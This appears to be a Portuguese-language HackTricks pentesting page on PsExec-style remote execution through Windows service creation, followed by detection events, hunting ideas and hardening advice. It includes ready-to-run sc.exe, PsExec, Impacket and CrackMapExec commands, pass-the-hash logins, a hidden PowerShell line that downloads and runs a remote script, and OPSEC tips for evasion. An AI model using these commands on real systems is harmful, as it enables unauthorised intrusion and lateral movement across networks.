# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Como funcionam

Estas técnicas abusam remotamente do Windows Service Control Manager (SCM) via SMB/RPC para executar comandos em um host alvo. O fluxo comum é:

1. Autentique-se no alvo e acesse o compartilhamento ADMIN$ via SMB (TCP/445).
2. Copie um executável ou especifique uma linha de comando LOLBAS que o serviço executará.
3. Crie um serviço remotamente via SCM (MS-SCMR sobre \PIPE\svcctl) apontando para esse comando ou binário.
4. Inicie o serviço para executar o payload e, opcionalmente, capture stdin/stdout via um named pipe.
5. Pare o serviço e faça a limpeza (exclua o serviço e quaisquer binários gravados no disco).

Requisitos/pré-requisitos:
- Administrador local no alvo (SeCreateServicePrivilege) ou permissões explícitas para criar serviços no alvo.
- SMB (445) acessível e compartilhamento ADMIN$ disponível; Remote Service Management permitido pelo firewall do host.
- Restrições remotas do UAC: com contas locais, a filtragem de tokens pode bloquear o acesso de administrador pela rede, a menos que seja usado o Administrator integrado ou LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: usar um hostname/FQDN habilita Kerberos; conectar-se por IP geralmente faz com que seja usado NTLM (e isso pode ser bloqueado em ambientes reforçados).

### ScExec/WinExec manual via sc.exe

A seguir, é apresentada uma abordagem mínima para criar um serviço. A imagem do serviço pode ser um EXE gravado no disco ou um LOLBAS como cmd.exe ou powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Observações:
- Espere um erro de timeout ao iniciar um EXE que não seja um serviço; a execução ainda acontece.
- Para ser mais OPSEC-friendly, prefira comandos fileless (cmd /c, powershell -enc) ou exclua os artefatos deixados no disco.

Encontre etapas mais detalhadas em: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Ferramentas e exemplos

### Sysinternals PsExec.exe

- Ferramenta clássica de administração que usa SMB para soltar PSEXESVC.exe em ADMIN$, instalar um serviço temporário (nome padrão PSEXESVC) e fazer proxy de I/O por meio de named pipes.
- Exemplos de uso:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Você pode iniciar diretamente do Sysinternals Live via WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Deixa eventos de instalação/desinstalação de serviço (o nome do serviço costuma ser PSEXESVC, a menos que -r seja usado) e cria C:\Windows\PSEXESVC.exe durante a execução.

### Impacket psexec.py (semelhante ao PsExec)

- Usa um serviço semelhante ao RemCom incorporado. Grava um binário de serviço temporário (geralmente com nome aleatório) via ADMIN$, cria um serviço (por padrão, geralmente RemComSvc) e faz proxy de I/O por um named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefatos
- EXE temporário em C:\Windows\ (8 caracteres aleatórios). O nome do serviço é RemComSvc por padrão, a menos que seja substituído.

### Impacket smbexec.py (SMBExec)

- Cria um serviço temporário que inicia cmd.exe e usa um named pipe para I/O. Em geral, evita gravar um payload EXE completo; a execução de comandos é seminterativa.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa vários métodos de lateral movement, incluindo exec baseado em serviço.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) inclui a modificação/criação de serviços para executar um comando remotamente.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Você também pode usar o CrackMapExec para executar por meio de diferentes backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, detecção e artefatos

Artefatos típicos no host/rede ao usar técnicas semelhantes ao PsExec:
- Security 4624 (Logon Type 3) e 4672 (Special Privileges) no destino para a conta de administrador usada.
- Eventos Security 5140/5145 File Share e File Share Detailed mostrando acesso a ADMIN$ e criação/gravação de binários de serviço (por exemplo, PSEXESVC.exe ou um .exe aleatório de 8 caracteres).
- **System** 7045 do Service Control Manager para instalação de serviço no destino: nomes como PSEXESVC, RemComSvc ou personalizados (`-r` / `-service-name`). Isso comprova que um serviço foi instalado, não que sua imagem foi executada. Correlacione o horário e o caminho da imagem com eventos de processo ou com uma entrada de prefetch correspondente à imagem do serviço, quando disponível.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) para services.exe ou para a imagem do serviço, 3 (Network Connect), 11 (File Create) em C:\Windows\, 17/18 (Pipe Created/Connected) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_* ou equivalentes aleatórios.
- Artefato de registro da EULA do Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 no host do operador (se não for suprimido).

Ideias para hunting
- Gere alertas para instalações de serviço cujo ImagePath inclua cmd.exe /c, powershell.exe ou locais TEMP.
- Procure criações de processos em que ParentImage seja C:\Windows\PSEXESVC.exe ou processos filhos de services.exe executados como LOCAL SYSTEM que executem shells.
- Sinalize named pipes terminados em -stdin/-stdout/-stderr ou nomes de pipes conhecidos de clones do PsExec.

## Solução de problemas comuns
- Acesso negado (5) ao criar serviços: o usuário não é realmente administrador local, há restrições de UAC remoto para contas locais ou há proteção contra adulteração do EDR no caminho do binário do serviço.
- O caminho de rede não foi encontrado (53) ou não foi possível conectar a ADMIN$: firewall bloqueando SMB/RPC ou compartilhamentos administrativos desativados.
- Kerberos falha, mas NTLM está bloqueado: conecte-se usando o hostname/FQDN (não o IP), garanta SPNs corretos ou forneça -k/-no-pass com tickets ao usar Impacket.
- O início do serviço expira, mas o payload foi executado: isso é esperado se não for um binário de serviço real; capture a saída em um arquivo ou use smbexec para I/O em tempo real.

## Observações de hardening
- Windows 11 24H2 e Windows Server 2025 exigem assinatura SMB por padrão para conexões de saída (e conexões de entrada no Windows 11). Isso não interrompe o uso legítimo do PsExec com credenciais válidas, mas impede o abuso de relay SMB sem assinatura e pode afetar dispositivos que não oferecem suporte à assinatura.<sup>[[2]](#references)</sup>
- O novo bloqueio de NTLM do cliente SMB (Windows 11 24H2/Server 2025) pode impedir o fallback para NTLM ao conectar-se por IP ou a servidores sem Kerberos. Em ambientes reforçados, isso interromperá o PsExec/SMBExec baseado em NTLM; use Kerberos (hostname/FQDN) ou configure exceções quando necessário para fins legítimos.<sup>[[2]](#references)</sup>
- Princípio do menor privilégio: minimize a associação ao grupo de administradores locais, prefira Just-in-Time/Just-Enough Admin, imponha LAPS e monitore/alerte sobre instalações de serviço 7045.

## Veja também

- Execução remota baseada em WMI (geralmente com menos arquivos):

{{#ref}}
./wmiexec.md
{{#endref}}

- Execução remota baseada em WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening da segurança SMB no Windows Server 2025 e Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Usando credenciais para dominar máquinas Windows - Parte 2 (PSExec e serviços)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Solucionar problemas de reinicializações inesperadas usando logs de eventos do sistema](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
